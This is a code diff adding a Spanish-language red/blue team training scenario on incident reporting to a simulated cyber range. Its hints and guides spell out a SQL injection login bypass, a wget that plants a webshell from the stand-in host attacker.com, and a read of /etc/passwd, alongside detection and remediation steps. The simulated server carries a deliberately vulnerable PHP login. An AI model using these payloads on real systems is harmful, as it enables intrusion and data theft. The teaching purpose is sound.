@@ -295,6 +295,369 @@ const INITIAL_ENV_SCENARIO_9: VirtualEnvironment = {
     timeline: []
 };
 
+export const incidentReportScenario: InteractiveScenario = {
+    id: 'escenario11',
+    isInteractive: true,
+    icon: 'file-text',
+    color: 'bg-purple-600',
+    title: 'El Primer Reporte (Documentación de Incidentes)',
+    subtitle: 'Respuesta completa a incidentes con documentación profesional según formato ESIT.',
+    description: 'Un incidente de seguridad real requiere documentación profesional. El Equipo Rojo ejecuta un ataque multi-fase mientras el Equipo Azul debe detectarlo, contenerlo y documentar TODO según el formato oficial ESIT.',
+    difficulty: 'intermediate',
+    team: 'both',
+    
+    initialEnvironment: {
+        networks: {
+            'dmz': {
+                hosts: [{
+                    ip: '10.0.50.10',
+                    hostname: 'APP-SERVER-01',
+                    os: 'linux',
+                    services: {
+                        22: { name: 'ssh', version: 'OpenSSH 8.4', state: 'open', vulnerabilities: [] },
+                        80: { name: 'apache', version: 'Apache 2.4.46', state: 'open', vulnerabilities: [
+                            { cve: 'CVE-2021-WEBAPP', description: 'SQL Injection in login form', severity: 'critical' }
+                        ]},
+                        443: { name: 'apache-ssl', version: 'Apache 2.4.46', state: 'open', vulnerabilities: [] },
+                        3306: { name: 'mysql', version: 'MySQL 8.0.26', state: 'open', vulnerabilities: [] }
+                    },
+                    users: [
+                        { username: 'webadmin', password: 'WebAdmin2024!', privileges: 'admin' },
+                        { username: 'blue-team', password: 'BlueTeam$ecure2024', privileges: 'admin' },
+                        { username: 'dbuser', password: 'DbUser123', privileges: 'user' }
+                    ],
+                    files: [
+                        { path: '/var/www/html/login.php', permissions: '644', content: '<?php\n// Vulnerable login form\n$user = $_POST["user"];\n$pass = $_POST["pass"];\n$query = "SELECT * FROM users WHERE user=\'$user\' AND pass=\'$pass\'";\n?>', hash: 'webapp_hash_123' },
+                        { path: '/var/www/html/admin.php', permissions: '644', content: '<?php\n// Admin panel\nif($_SESSION["admin"]) { echo "Welcome Admin"; }\n?>', hash: 'admin_hash_456' },
+                        { path: '/var/log/apache2/access.log', permissions: '640', content: '', hash: 'log_hash_789' },
+                        { path: '/var/log/apache2/error.log', permissions: '640', content: '', hash: 'log_hash_790' },
+                        { path: '/home/blue-team/incident_report.txt', permissions: '600', content: '', hash: 'report_hash_001' }
+                    ],
+                    systemState: {
+                        cpuLoad: 8.0,
+                        memoryUsage: 35.0,
+                        networkConnections: 45,
+                        failedLogins: 0
+                    }
+                }],
+                firewall: {
+                    enabled: true,
+                    rules: [
+                        { id: 'fw-1', action: 'allow', protocol: 'tcp', destPort: 22 },
+                        { id: 'fw-2', action: 'allow', protocol: 'tcp', destPort: 80 },
+                        { id: 'fw-3', action: 'allow', protocol: 'tcp', destPort: 443 }
+                    ]
+                },
+                ids: {
+                    enabled: true,
+                    signatures: ['SQL_INJECTION', 'WEB_SHELL_UPLOAD', 'SUSPICIOUS_QUERIES'],
+                    alerts: []
+                }
+            }
+        },
+        attackProgress: {
+            reconnaissance: [],
+            compromised: [],
+            credentials: {},
+            persistence: []
+        },
+        defenseProgress: {
+            hardenedHosts: [],
+            blockedIPs: [],
+            patchedVulnerabilities: []
+        },
+        timeline: []
+    },
+    
+    objectives: [
+        // === EQUIPO ROJO - FASE 1: RECONOCIMIENTO Y EXPLOTACIÓN ===
+        {
+            id: 'red-reconnaissance',
+            description: 'Fase 1: Reconocimiento - Escanear APP-SERVER-01 e identificar servicios vulnerables',
+            points: 10,
+            required: true,
+            validator: (env) => env.attackProgress.reconnaissance.includes('10.0.50.10'),
+            hint: 'Usa: nmap -sV -sC APP-SERVER-01 para enumerar servicios y versiones'
+        },
+        {
+            id: 'red-webapp-exploit',
+            description: 'Fase 2: Explotación - Ejecutar SQL Injection en el formulario de login',
+            points: 25,
+            required: true,
+            validator: (env) => {
+                return env.timeline.some(log => 
+                    log.source_team === 'red' && 
+                    (log.message.includes("curl") || log.message.includes("sqlmap")) &&
+                    log.message.includes("login.php")
+                );
+            },
+            hint: "Usa: curl -X POST http://APP-SERVER-01/login.php -d \"user=admin' OR '1'='1&pass=anything\""
+        },
+        {
+            id: 'red-access-admin',
+            description: 'Fase 3: Acceso - Obtener acceso al panel de administración',
+            points: 20,
+            required: true,
+            validator: (env) => {
+                return env.timeline.some(log => 
+                    log.source_team === 'red' && 
+                    log.message.includes("admin.php")
+                );
+            },
+            hint: 'Después del SQL Injection exitoso, accede a: curl http://APP-SERVER-01/admin.php'
+        },
+        {
+            id: 'red-webshell-upload',
+            description: 'Fase 4: Persistencia - Subir webshell para mantener acceso',
+            points: 25,
+            required: true,
+            validator: (env) => env.attackProgress.persistence.includes('webshell_deployed'),
+            hint: 'Simula: wget http://attacker.com/shell.php -O /var/www/html/shell.php'
+        },
+        {
+            id: 'red-data-exfiltration',
+            description: 'Fase 5: Exfiltración - Extraer datos de la base de datos',
+            points: 20,
+            required: true,
+            validator: (env) => env.attackProgress.persistence.includes('data_exfiltrated'),
+            hint: 'Ejecuta comandos SQL para extraer datos sensibles de la base de datos'
+        },
+        {
+            id: 'red-report-creation',
+            description: '📋 CRÍTICO: Elaborar reporte de ataque documentando TODAS las fases ejecutadas',
+            points: 30,
+            required: true,
+            validator: (env) => {
+                return env.timeline.some(log => 
+                    log.source_team === 'red' && 
+                    log.message.includes("nano /home/blue-team/red_team_report.txt")
+                );
+            },
+            hint: 'FORMATO REQUERIDO:\n1. Vectores de ataque utilizados\n2. Vulnerabilidades explotadas (CVE)\n3. Comandos ejecutados (timeline completa)\n4. Datos comprometidos\n5. Nivel de acceso obtenido\n6. Persistencia establecida\n7. Recomendaciones de remediación'
+        },
+        
+        // === EQUIPO AZUL - DETECCIÓN, CONTENCIÓN Y DOCUMENTACIÓN ===
+        {
+            id: 'blue-detection-scan',
+            description: 'Fase 1: Detección - Identificar el escaneo de reconocimiento en logs',
+            points: 10,
+            required: true,
+            validator: (env) => {
+                return env.timeline.some(log => 
+                    log.source_team === 'blue' && 
+                    (log.message.includes("grep") || log.message.includes("tail")) &&
+                    log.message.includes("access.log")
+                );
+            },
+            hint: 'Revisa logs: tail -f /var/log/apache2/access.log | grep -i "nmap\|scan"'
+        },
+        {
+            id: 'blue-detection-sqli',
+            description: 'Fase 2: Detección - Identificar intentos de SQL Injection',
+            points: 15,
+            required: true,
+            validator: (env) => {
+                return env.timeline.some(log => 
+                    log.source_team === 'blue' && 
+                    log.message.includes("grep") && 
+                    (log.message.includes("OR") || log.message.includes("UNION") || log.message.includes("'"))
+                );
+            },
+            hint: 'Busca patrones SQL: grep -i "OR\|UNION\|SELECT\|\'\"" /var/log/apache2/access.log'
+        },
+        {
+            id: 'blue-containment-block',
+            description: 'Fase 3: Contención - Bloquear IP del atacante inmediatamente',
+            points: 20,
+            required: true,
+            validator: (env) => {
+                return env.networks.dmz.firewall.rules.some(r => 
+                    r.action === 'deny' && 
+                    r.sourceIP === '192.168.1.100'
+                );
+            },
+            hint: 'Ejecuta: sudo ufw deny from 192.168.1.100 (IP del atacante)'
+        },
+        {
+            id: 'blue-containment-services',
+            description: 'Fase 4: Contención - Detener servicios comprometidos',
+            points: 15,
+            required: true,
+            validator: (env) => {
+                return env.timeline.some(log => 
+                    log.source_team === 'blue' && 
+                    log.message.includes("systemctl stop apache2")
+                );
+            },
+            hint: 'Detén el servicio web: sudo systemctl stop apache2'
+        },
+        {
+            id: 'blue-forensics-evidence',
+            description: 'Fase 5: Forense - Recolectar evidencias del ataque',
+            points: 20,
+            required: true,
+            validator: (env) => {
+                return env.timeline.some(log => 
+                    log.source_team === 'blue' && 
+                    (log.message.includes("sha256sum") || log.message.includes("md5sum"))
+                );
+            },
+            hint: 'Genera hashes de archivos críticos: sha256sum /var/www/html/*.php > /home/blue-team/evidence_hashes.txt'
+        },
+        {
+            id: 'blue-forensics-logs',
+            description: 'Fase 6: Forense - Preservar logs del incidente',
+            points: 15,
+            required: true,
+            validator: (env) => {
+                return env.timeline.some(log => 
+                    log.source_team === 'blue' && 
+                    log.message.includes("cp") && 
+                    log.message.includes("access.log")
+                );
+            },
+            hint: 'Preserva logs: sudo cp /var/log/apache2/access.log /home/blue-team/incident_access.log'
+        },
+        {
+            id: 'blue-remediation',
+            description: 'Fase 7: Remediación - Aplicar parches de seguridad',
+            points: 20,
+            required: true,
+            validator: (env) => {
+                return env.defenseProgress.patchedVulnerabilities.includes('CVE-2021-WEBAPP');
+            },
+            hint: 'Simula parcheo: sudo nano /var/www/html/login.php (corrige la query SQL usando prepared statements)'
+        },
+        {
+            id: 'blue-report-creation',
+            description: '📋 CRÍTICO: Elaborar Reporte de Incidente completo siguiendo formato ESIT',
+            points: 35,
+            required: true,
+            validator: (env) => {
+                return env.timeline.some(log => 
+                    log.source_team === 'blue' && 
+                    log.message.includes("nano /home/blue-team/incident_report.txt")
+                );
+            },
+            hint: 'FORMATO OFICIAL ESIT REQUERIDO:\n\n=== SECCIÓN 1: INFORMACIÓN DEL INCIDENTE ===\n- Fecha y Hora de Detección\n- Tipo de Incidente (SQL Injection + Webshell)\n- Nivel de Severidad (Crítico/Alto/Medio/Bajo)\n- Sistema Afectado (APP-SERVER-01)\n- IP del Atacante\n\n=== SECCIÓN 2: DESCRIPCIÓN DETALLADA ===\n- ¿Cómo se detectó el incidente?\n- Timeline completa del ataque (con timestamps)\n- Vectores de ataque identificados\n- Vulnerabilidades explotadas (CVE-2021-WEBAPP)\n\n=== SECCIÓN 3: ANÁLISIS DE IMPACTO ===\n- Sistemas comprometidos\n- Datos accedidos/exfiltrados\n- Nivel de acceso obtenido por el atacante\n- Impacto en la confidencialidad, integridad y disponibilidad\n\n=== SECCIÓN 4: ACCIONES DE CONTENCIÓN ===\n- IP bloqueada en firewall\n- Servicios detenidos\n- Persistencia eliminada (webshell)\n\n=== SECCIÓN 5: EVIDENCIAS RECOLECTADAS ===\n- Logs preservados (access.log, error.log)\n- Hashes de archivos comprometidos\n- Capturas de comandos maliciosos\n- Análisis de tráfico de red\n\n=== SECCIÓN 6: ANÁLISIS FORENSE ===\n- Punto de entrada inicial\n- Técnicas MITRE ATT&CK identificadas\n- Indicadores de Compromiso (IOCs)\n\n=== SECCIÓN 7: REMEDIACIÓN ===\n- Parches aplicados\n- Configuraciones modificadas\n- Validación de efectividad\n\n=== SECCIÓN 8: RECOMENDACIONES ===\n- Mejoras a corto plazo\n- Mejoras a mediano plazo\n- Mejoras a largo plazo\n- Controles preventivos adicionales\n\n=== SECCIÓN 9: LECCIONES APRENDIDAS ===\n- ¿Qué funcionó bien?\n- ¿Qué se puede mejorar?\n- Cambios en procedimientos\n\n=== SECCIÓN 10: CIERRE ===\n- Estado del incidente (Resuelto/En progreso)\n- Responsables\n- Firma y aprobación'
+        }
+    ],
+    
+    hints: [
+        {
+            trigger: (env) => env.timeline.filter(log => log.message.includes('nmap')).length > 0,
+            message: '🚨 [EQUIPO AZUL] Actividad de escaneo detectada. Inicia monitoreo intensivo de logs y prepara tu timeline de eventos.'
+        },
+        {
+            trigger: (env) => {
+                return env.timeline.some(log => 
+                    log.message.includes("login.php") && 
+                    (log.message.includes("OR") || log.message.includes("'"))
+                );
+            },
+            message: '🔴 [EQUIPO AZUL] ¡ALERTA CRÍTICA! SQL Injection en progreso. CONTENER INMEDIATAMENTE y comenzar recolección de evidencias.'
+        },
+        {
+            trigger: (env) => env.attackProgress.persistence.includes('webshell_deployed'),
+            message: '💀 [EQUIPO AZUL] Webshell detectado. El atacante tiene persistencia. Ejecuta: sudo find /var/www/html -name "*.php" -exec sha256sum {} \; para verificar archivos.'
+        },
+        {
+            trigger: (env) => {
+                const redComplete = ['red-reconnaissance', 'red-webapp-exploit', 'red-access-admin', 'red-webshell-upload'].every(id => 
+                    env.timeline.some(log => log.source_team === 'red')
+                );
+                const noReport = !env.timeline.some(log => 
+                    log.source_team === 'red' && log.message.includes("report")
+                );
+                return redComplete && noReport;
+            },
+            message: '📝 [EQUIPO ROJO] Has completado el ataque. AHORA DOCUMENTA TODO en tu reporte. Sin documentación profesional, tu trabajo no tiene valor.'
+        },
+        {
+            trigger: (env) => {
+                const blueComplete = ['blue-detection-scan', 'blue-detection-sqli', 'blue-containment-block', 'blue-forensics-evidence'].every(id => 
+                    env.timeline.some(log => log.source_team === 'blue')
+                );
+                const noReport = !env.timeline.some(log => 
+                    log.source_team === 'blue' && log.message.includes("incident_report")
+                );
+                return blueComplete && noReport;
+            },
+            message: '📋 [EQUIPO AZUL] Has contenido el incidente. AHORA DOCUMENTA TODO siguiendo el formato ESIT oficial. La documentación es tan crítica como la respuesta técnica.'
+        },
+        {
+            trigger: (env) => {
+                const logs = env.timeline.filter(log => log.source_team === 'blue');
+                return logs.length > 5 && !env.defenseProgress.blockedIPs.includes('192.168.1.100');
+            },
+            message: '⚠️ [EQUIPO AZUL] Estás investigando pero NO has bloqueado al atacante. PRIORIDAD 1: Contener la amenaza. PRIORIDAD 2: Investigar.'
+        }
+    ],
+    
+    evaluation: (env) => {
+        const redObjectives = ['red-reconnaissance', 'red-webapp-exploit', 'red-access-admin', 'red-webshell-upload', 'red-data-exfiltration', 'red-report-creation'];
+        const blueObjectives = ['blue-detection-scan', 'blue-detection-sqli', 'blue-containment-block', 'blue-containment-services', 'blue-forensics-evidence', 'blue-forensics-logs', 'blue-remediation', 'blue-report-creation'];
+        
+        const redPoints = redObjectives.reduce((sum, id) => {
+            const obj = incidentReportScenario.objectives.find(o => o.id === id);
+            return sum + (obj?.validator(env) ? obj.points : 0);
+        }, 0);
+        
+        const bluePoints = blueObjectives.reduce((sum, id) => {
+            const obj = incidentReportScenario.objectives.find(o => o.id === id);
+            return sum + (obj?.validator(env) ? obj.points : 0);
+        }, 0);
+        
+        const feedback: string[] = [];
+        const hasRedReport = env.timeline.some(log => log.source_team === 'red' && log.message.includes("report"));
+        const hasBlueReport = env.timeline.some(log => log.source_team === 'blue' && log.message.includes("incident_report"));
+        const isContained = env.defenseProgress.blockedIPs.includes('192.168.1.100');
+        const isPatched = env.defenseProgress.patchedVulnerabilities.includes('CVE-2021-WEBAPP');
+        
+        // Evaluar Equipo Rojo
+        if (redPoints >= 100 && hasRedReport) {
+            feedback.push('⚔️ **EQUIPO ROJO: EXCELENTE** - Ataque completo y documentado profesionalmente.');
+        } else if (redPoints >= 80) {
+            feedback.push('⚔️ **EQUIPO ROJO: BUENO** - Ataque exitoso pero documentación incompleta.');
+        } else if (redPoints >= 60) {
+            feedback.push('⚔️ **EQUIPO ROJO: REGULAR** - Ataque parcial o sin documentación adecuada.');
+        } else {
+            feedback.push('⚔️ **EQUIPO ROJO: INSUFICIENTE** - No se completaron las fases críticas del ataque.');
+        }
+        
+        // Evaluar Equipo Azul
+        if (bluePoints >= 120 && hasBlueReport && isContained && isPatched) {
+            feedback.push('🛡️ **EQUIPO AZUL: EXCELENTE** - Respuesta completa con documentación profesional.');
+        } else if (bluePoints >= 100 && isContained) {
+            feedback.push('🛡️ **EQUIPO AZUL: BUENO** - Incidente contenido pero documentación incompleta.');
+        } else if (bluePoints >= 80) {
+            feedback.push('🛡️ **EQUIPO AZUL: REGULAR** - Respuesta parcial o documentación inadecuada.');
+        } else {
+            feedback.push('🛡️ **EQUIPO AZUL: INSUFICIENTE** - Fallas críticas en contención o documentación.');
+        }
+        
+        feedback.push(`\n**Puntuación Final:**\nEquipo Rojo: ${redPoints}/130 puntos\nEquipo Azul: ${bluePoints}/150 puntos`);
+        
+        if (!hasRedReport) {
+            feedback.push('\n❌ **EQUIPO ROJO**: Reporte técnico NO presentado. Sin documentación, tu trabajo no es válido en un entorno profesional.');
+        }
+        
+        if (!hasBlueReport) {
+            feedback.push('\n❌ **EQUIPO AZUL**: Reporte de incidente NO completado según formato ESIT. La documentación es OBLIGATORIA en respuesta a incidentes.');
+        }
+        
+        if (hasBlueReport && hasRedReport) {
+            feedback.push('\n✅ **AMBOS EQUIPOS**: Documentación completa presentada. Este es el estándar profesional esperado.');
+        }
+        
+        return {
+            completed: (redPoints >= 100 && hasRedReport) || (bluePoints >= 120 && hasBlueReport),
+            score: Math.max(redPoints, bluePoints),
+            feedback
+        };
+    }
+};
+
 export const TRAINING_SCENARIOS: (TrainingScenario | InteractiveScenario)[] = [
     {
         id: 'escenario7',
@@ -370,7 +733,8 @@ export const TRAINING_SCENARIOS: (TrainingScenario | InteractiveScenario)[] = [
             { trigger: (env) => env.attackProgress.reconnaissance.includes('WEB-DMZ-01') && !env.attackProgress.credentials['root@10.10.0.50'], message: "Rojo: Prueba LFI en view.php. Busca archivos de configuración." }
         ],
         evaluation: () => ({ completed: false, score: 0, feedback: [] })
-    }
+    },
+    incidentReportScenario
 ];
 
 export const RED_TEAM_HELP_TEXT = `
@@ -414,6 +778,11 @@ export const SCENARIO_HELP_TEXTS: { [key: string]: { red: string; blue: string; 
         red: "<p class='mt-2 text-red-300'>Objetivo: Kill Chain Completa. 1) Escanea WEB-DMZ-01. 2) Encuentra LFI en view.php. 3) Lee config.php para obtener credenciales. 4) Pivota a la red interna 10.10.0.50 usando SSH o MySQL.</p>",
         blue: "<p class='mt-2 text-blue-300'>Objetivo: Detectar y Bloquear. 1) Revisa logs por patrones LFI (../etc/passwd). 2) Bloquear IP atacante. 3) Parchear view.php. 4) Implementar reglas de firewall para prevenir tráfico de DMZ a Interna.</p>",
         general: "<p class='text-yellow-200'>Escenario 9: Movimiento Lateral y Defensa en Profundidad.</p>"
+    },
+    'escenario11': {
+        general: `<pre class="whitespace-pre-wrap font-mono text-xs">\n<strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 11: El Primer Reporte</strong>\nSimulación de incidente real con documentación profesional obligatoria.\nAmbos equipos DEBEN elaborar reportes completos para aprobar.\n</pre>`,
+        blue: `<pre class="whitespace-pre-wrap font-mono text-xs">\n<strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - RESPUESTA A INCIDENTES</strong>\nEste escenario simula tu PRIMER incidente real. La documentación es TAN importante como la respuesta técnica.\n\n<strong>FASE 1: DETECCIÓN TEMPRANA</strong>\n1. Monitorea logs continuamente:\n   <strong class="text-amber-300">tail -f /var/log/apache2/access.log</strong>\n   <strong class="text-amber-300">tail -f /var/log/apache2/error.log</strong>\n\n2. Busca patrones de ataque:\n   <strong class="text-amber-300">grep -i 'nmap\|scan\|nikto' /var/log/apache2/access.log</strong>\n   <strong class="text-amber-300">grep -i "OR\|UNION\|SELECT\|'\"" /var/log/apache2/access.log</strong>\n\n<strong>FASE 2: CONTENCIÓN INMEDIATA</strong>\n1. Identifica IP del atacante en logs\n2. Bloquea la IP:\n   <strong class="text-amber-300">sudo ufw deny from [IP_ATACANTE]</strong>\n\n3. Detén servicios comprometidos:\n   <strong class="text-amber-300">sudo systemctl stop apache2</strong>\n   <strong class="text-amber-300">sudo systemctl stop mysql</strong>\n\n<strong>FASE 3: RECOLECCIÓN DE EVIDENCIAS (CRÍTICO)</strong>\n1. Preserva logs ANTES de que se sobrescriban:\n   <strong class="text-amber-300">sudo cp /var/log/apache2/access.log ~/incident_access.log</strong>\n   <strong class="text-amber-300">sudo cp /var/log/apache2/error.log ~/incident_error.log</strong>\n\n2. Genera hashes de archivos web:\n   <strong class="text-amber-300">sha256sum /var/www/html/*.php > ~/evidence_hashes.txt</strong>\n\n3. Busca archivos sospechosos:\n   <strong class="text-amber-300">find /var/www/html -name '*.php' -mtime -1</strong>\n   <strong class="text-amber-300">ls -la /var/www/html/ | grep shell</strong>\n\n<strong>FASE 4: ANÁLISIS FORENSE</strong>\n1. Revisa intentos de SQL Injection:\n   <strong class="text-amber-300">grep -i "login.php" ~/incident_access.log | grep -i "OR\|'"</strong>\n\n2. Identifica comandos ejecutados por el atacante\n3. Documenta la timeline completa\n\n<strong>FASE 5: REMEDIACIÓN</strong>\n1. Parchea la vulnerabilidad:\n   <strong class="text-amber-300">sudo nano /var/www/html/login.php</strong>\n   (Reemplaza queries directas con prepared statements)\n\n2. Elimina webshells si existen:\n   <strong class="text-amber-300">sudo rm /var/www/html/shell.php</strong>\n\n3. Reinicia servicios seguros:\n   <strong class="text-amber-300">sudo systemctl start apache2</strong>\n\n<strong>FASE 6: DOCUMENTACIÓN (OBLIGATORIA)</strong>\nElabora tu reporte siguiendo el formato ESIT:\n<strong class="text-amber-300">nano /home/blue-team/incident_report.txt</strong>\n\n<strong class="text-red-500">TU REPORTE DEBE INCLUIR:</strong>\n✓ Información del incidente (fecha, hora, severidad)\n✓ Timeline completa con timestamps\n✓ Vectores de ataque identificados\n✓ CVEs explotadas\n✓ Impacto en C-I-D (Confidencialidad, Integridad, Disponibilidad)\n✓ Acciones de contención ejecutadas\n✓ Evidencias recolectadas (con hashes)\n✓ Análisis forense detallado\n✓ Remediación aplicada\n✓ Recomendaciones (corto, mediano y largo plazo)\n✓ Lecciones aprendidas\n\n<strong class="text-yellow-300">RECORDATORIO:</strong> En un entorno profesional, un incidente SIN documentación\nadecuada es considerado NO RESUELTO, sin importar qué tan bien\nhayas contenido técnicamente la amenaza.\n</pre>`,
+        red: `<pre class="whitespace-pre-wrap font-mono text-xs">\n<strong class="text-red-400">EQUIPO ROJO (ATACANTE) - PENTESTING CON DOCUMENTACIÓN</strong>\nSimulas un atacante real, pero con un objetivo adicional: DOCUMENTAR TODO.\nEn pentesting profesional, tu reporte vale más que el exploit.\n\n<strong>FASE 1: RECONOCIMIENTO</strong>\n1. Enumera el objetivo:\n   <strong class="text-amber-300">nmap -sV -sC -p- APP-SERVER-01</strong>\n   <strong class="text-amber-300">nmap --script=http-enum APP-SERVER-01</strong>\n\n2. Identifica tecnologías:\n   <strong class="text-amber-300">curl -I http://APP-SERVER-01</strong>\n   <strong class="text-amber-300">nikto -h http://APP-SERVER-01</strong>\n\n<strong class="text-red-500">DOCUMENTA:</strong> Todos los puertos abiertos, servicios, versiones\n\n<strong>FASE 2: ANÁLISIS DE VULNERABILIDADES</strong>\n1. Prueba el formulario de login:\n   <strong class="text-amber-300">curl http://APP-SERVER-01/login.php</strong>\n\n2. Busca inyecciones SQL:\n   <strong class="text-amber-300">dirb http://APP-SERVER-01 /usr/share/wordlists/dirb/common.txt</strong>\n\n<strong class="text-red-500">DOCUMENTA:</strong> Vulnerabilidades encontradas, CVEs aplicables\n\n<strong>FASE 3: EXPLOTACIÓN (SQL INJECTION)</strong>\n1. Ejecuta SQL Injection básico:\n   <strong class="text-amber-300">curl -X POST http://APP-SERVER-01/login.php -d \"user=admin' OR '1'='1&pass=anything\"</strong>\n\n2. Si funciona, prueba bypass de autenticación:\n   <strong class="text-amber-300">curl -X POST http://APP-SERVER-01/login.php -d \"user=admin'--&pass=x\"</strong>\n\n3. Accede al panel de administración:\n   <strong class="text-amber-300">curl http://APP-SERVER-01/admin.php</strong>\n\n<strong class="text-red-500">DOCUMENTA:</strong> Payload exacto, respuesta del servidor, nivel de acceso obtenido\n\n<strong>FASE 4: POST-EXPLOTACIÓN</strong>\n1. Intenta obtener shell (simulado):\n   <strong class="text-amber-300">wget http://attacker.com/shell.php -O /var/www/html/shell.php</strong>\n\n2. Simula exfiltración de datos:\n   <strong class="text-amber-300">curl http://APP-SERVER-01/admin.php?action=dump_db</strong>\n\n<strong class="text-red-500">DOCUMENTA:</strong> Persistencia establecida, datos accedidos\n\n<strong>FASE 5: ENUMERACIÓN DE DATOS (Opcional)</strong>\n1. Si tienes webshell, enumera sistema:\n   <strong class="text-amber-300">whoami</strong>\n   <strong class="text-amber-300">uname -a</strong>\n   <strong class=\"text-amber-300\">cat /etc/passwd</strong>\n\n<strong>FASE 6: ELABORACIÓN DE REPORTE (OBLIGATORIO)</strong>\nCrea tu reporte técnico de pentesting:\n<strong class="text-amber-300">nano /home/blue-team/red_team_report.txt</strong>\n\n<strong class="text-yellow-300">TU REPORTE TÉCNICO DEBE INCLUIR:</strong>\n\n<strong>1. RESUMEN EJECUTIVO</strong>\n   - Sistema objetivo\n   - Nivel de riesgo (Crítico/Alto/Medio/Bajo)\n   - Resumen del ataque en 3-4 líneas\n\n<strong>2. ALCANCE DEL PENTESTING</strong>\n   - IPs/Hosts probados\n   - Servicios evaluados\n   - Restricciones (si las hay)\n\n<strong>3. METODOLOGÍA</strong>\n   - Fases ejecutadas (Reconocimiento → Explotación → Post-explotación)\n   - Herramientas utilizadas\n\n<strong>4. HALLAZGOS DETALLADOS</strong>\n   Para cada vulnerabilidad encontrada:\n   ✓ Nombre y descripción\n   ✓ CVE (si aplica): CVE-2021-WEBAPP\n   ✓ Severidad (CVSS Score si es posible)\n   ✓ Pasos para reproducir (comandos exactos)\n   ✓ Evidencia (output de comandos)\n   ✓ Impacto potencial\n\n<strong>5. EXPLOTACIÓN EXITOSA</strong>\n   - Timeline del ataque (con timestamps)\n   - Comandos ejecutados paso a paso\n   - Nivel de acceso obtenido\n   - Datos comprometidos\n\n<strong>6. RECOMENDACIONES DE REMEDIACIÓN</strong>\n   Para cada vulnerabilidad:\n   ✓ Cómo parchear (código corregido si es posible)\n   ✓ Prioridad de remediación (Crítico/Alto/Medio/Bajo)\n   ✓ Esfuerzo estimado\n\n<strong>7. CONCLUSIONES</strong>\n   - Postura general de seguridad\n   - Riesgos críticos que requieren atención inmediata\n\n<strong class="text-red-500">FORMATO PROFESIONAL:</strong>\n- Usa markdown para estructura clara\n- Incluye código en bloques de código\n- Sé técnico pero comprensible\n- Cada hallazgo debe poder ser reproducido por el Equipo Azul\n\n<strong class="text-yellow-300">RECORDATORIO CRÍTICO:</strong>\nEn pentesting real, un exploit SIN documentación detallada es INÚTIL.\nTu cliente (el Equipo Azul) necesita entender EXACTAMENTE qué hiciste\ny cómo remediarlo. Tu reporte es tu producto final.\n</pre>`
     }
 };
 
